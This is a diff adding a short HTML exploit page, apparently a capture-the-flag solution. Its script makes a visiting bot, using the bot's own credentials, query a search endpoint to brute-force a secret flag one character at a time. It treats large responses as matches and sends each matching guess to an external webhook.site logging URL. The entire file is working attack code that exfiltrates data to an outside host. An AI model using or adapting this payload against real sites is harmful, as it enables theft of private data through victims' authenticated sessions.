@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head><title>Exploit</title></head>
+<body>
+<script>
+    // Your Webhook.site URL
+    const logger = "https://webhook.site/14c40452-896f-4ed3-98f1-ad026e7d4a08";
+    const target = "https://jtxhz6mt-3000.inc1.devtunnels.ms/search?q=";
+    const alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}";
+    
+    // Start with the known prefix. 
+    // If "FLAG{" doesn't work, try "ARKHAM_"
+    let known = "FLAG{"; 
+
+    async function brute(char) {
+        const guess = known + char;
+        try {
+            // The bot performs the search using its ALPHA credentials
+            const res = await fetch(target + guess);
+            const body = await res.text();
+
+            // Based on Hint 2: Large body = Match
+            if (body.length > 500) { 
+                fetch(logger + "?match=" + encodeURIComponent(guess));
+            }
+        } catch (e) {}
+    }
+
+    // Iterate through the alphabet
+    alphabet.split('').forEach(brute);
+</script>
+</body>
+</html>
